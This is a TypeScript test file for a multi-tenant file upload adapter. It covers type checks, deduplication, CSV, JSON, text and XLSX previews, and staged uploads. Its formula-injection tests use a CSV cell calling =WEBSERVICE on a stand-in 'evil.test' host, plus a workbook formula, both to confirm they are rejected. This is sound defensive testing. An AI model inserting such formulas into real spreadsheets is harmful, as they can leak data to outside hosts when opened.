import { strToU8, zipSync } from "fflate";
import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { DatabaseSync } from "node:sqlite";
import { afterEach, describe, expect, it, vi } from "vitest";
import { TenantFileAdapter, FileAdapterError } from "./file-adapter.ts";

const tempRoots: string[] = [];

afterEach(async () => {
  await Promise.all(tempRoots.splice(0).map((root) => rm(root, { recursive: true, force: true })));
});

function createTransit() {
  const stored = new Map<string, File>();
  return {
    maxBytes: 1024 * 1024,
    create: vi.fn(async (file: File) => {
      const fileId = `file-${stored.size + 1}`;
      stored.set(fileId, file);
      return { fileId, downloadUrl: `/files/${fileId}`, sizeBytes: file.size, name: file.name, mimeType: file.type };
    }),
    async read(fileId: string) {
      const file = stored.get(fileId);
      if (!file) throw new Error("not found");
      return { file, sizeBytes: file.size, name: file.name, mimeType: file.type };
    },
    async delete(fileId: string) {
      return stored.delete(fileId);
    },
    async cleanupExpired() {},
  };
}

describe("TenantFileAdapter", () => {
  it("accepts clean JSON and rejects malformed or unsupported content", async () => {
    const transit = createTransit();
    const files = new TenantFileAdapter("tenant-a", "workspace-a", transit, new DatabaseSync(":memory:"));
    await expect(
      files.upload(new File(['{"ok":true}'], "data.json", { type: "application/json" })),
    ).resolves.toMatchObject({
      kind: "json",
      scanStatus: "clean",
    });
    await expect(files.upload(new File(["not-json"], "data.json"))).rejects.toMatchObject({ code: "malicious_input" });
    await expect(files.upload(new File(["x"], "data.exe"))).rejects.toThrowError(
      new FileAdapterError(
        "unsupported_type",
        "Only CSV, Excel, JSON, Parquet, PDF, Markdown, and text files are supported.",
      ),
    );
  });

  it("deduplicates tenant uploads and returns parsed CSV previews", async () => {
    const transit = createTransit();
    const files = new TenantFileAdapter("tenant-a", "workspace-a", transit, new DatabaseSync(":memory:"));
    const file = new File(["name,amount\nAda,42\nLin,7"], "people.csv", { type: "text/csv" });
    const first = await files.upload(file);
    const duplicate = await files.upload(file);

    expect(duplicate.fileId).toBe(first.fileId);
    expect(transit.create).toHaveBeenCalledOnce();
    await expect(files.preview(first.fileId)).resolves.toEqual({
      kind: "csv",
      columns: ["name", "amount"],
      rows: [
        ["Ada", "42"],
        ["Lin", "7"],
      ],
      truncated: false,
    });
  });

  it("rejects spreadsheet formulas in CSV cells", async () => {
    const transit = createTransit();
    const files = new TenantFileAdapter("tenant-a", "workspace-a", transit, new DatabaseSync(":memory:"));
    await expect(
      files.upload(new File(['name,value\nattacker,=WEBSERVICE("https://evil.test")'], "evil.csv")),
    ).rejects.toMatchObject({ code: "malicious_input" });
    expect(transit.create).not.toHaveBeenCalled();
  });

  it("previews JSON and truncates text", async () => {
    const transit = createTransit();
    const files = new TenantFileAdapter("tenant-a", "workspace-a", transit, new DatabaseSync(":memory:"));
    const json = await files.upload(new File(['{"ok":true}'], "data.json", { type: "application/json" }));
    const text = await files.upload(new File(["x".repeat(10_001)], "large.txt", { type: "text/plain" }));

    await expect(files.preview(json.fileId)).resolves.toEqual({
      kind: "json",
      value: { ok: true },
      truncated: false,
    });
    await expect(files.preview(text.fileId)).resolves.toMatchObject({
      kind: "txt",
      text: "x".repeat(10_000),
      truncated: true,
    });
  });

  it("previews XLSX cells and rejects formulas", async () => {
    const transit = createTransit();
    const files = new TenantFileAdapter("tenant-a", "workspace-a", transit, new DatabaseSync(":memory:"));
    const workbook = (formula?: string) =>
      zipSync({
        "[Content_Types].xml": strToU8("<Types/>"),
        "xl/workbook.xml": strToU8(
          '<workbook><sheets><sheet name="Data" sheetId="1" r:id="rId1"/></sheets></workbook>',
        ),
        "xl/_rels/workbook.xml.rels": strToU8(
          '<Relationships><Relationship Id="rId1" Target="worksheets/sheet1.xml"/></Relationships>',
        ),
        "xl/sharedStrings.xml": strToU8("<sst><si><t>Name</t></si><si><t>Ada</t></si></sst>"),
        "xl/worksheets/sheet1.xml": strToU8(
          `<worksheet><sheetData><row r="1"><c r="A1" t="s"><v>0</v></c></row><row r="2"><c r="A2" t="s">${
            formula ? `<f>${formula}</f>` : ""
          }<v>1</v></c></row></sheetData></worksheet>`,
        ),
      });
    const uploaded = await files.upload(new File([workbook()], "data.xlsx"));
    await expect(files.preview(uploaded.fileId)).resolves.toMatchObject({
      kind: "excel",
      sheets: [{ name: "Data", rows: [["Name"], ["Ada"]] }],
    });
    await expect(files.upload(new File([workbook("WEBSERVICE(A1)")], "formula.xlsx"))).rejects.toMatchObject({
      code: "malicious_input",
    });
  });

  it("imports a staged upload without materializing it as a File", async () => {
    const root = await mkdtemp(join(tmpdir(), "connection-file-adapter-"));
    tempRoots.push(root);
    const path = join(root, "upload.tmp");
    await writeFile(path, "name,amount\nAda,42\n");
    const transit = createTransit();
    const createFromPath = vi.fn(async (staged: { path: string; sizeBytes: number; name: string; mimeType: string }) => ({
      fileId: "streamed.csv",
      downloadUrl: "/files/streamed.csv",
      sizeBytes: staged.sizeBytes,
      name: staged.name,
      mimeType: staged.mimeType,
    }));
    const stagedTransit = Object.assign(transit, { createFromPath });
    const files = new TenantFileAdapter(
      "tenant-a",
      "workspace-a",
      stagedTransit,
      new DatabaseSync(":memory:"),
    );

    await expect(
      files.uploadFromPath({ path, sizeBytes: 19, name: "people.csv", mimeType: "text/csv" }),
    ).resolves.toMatchObject({
      fileId: "streamed.csv",
      kind: "csv",
      scanStatus: "clean",
    });
    expect(createFromPath).toHaveBeenCalledOnce();
    expect(transit.create).not.toHaveBeenCalled();
  });
});
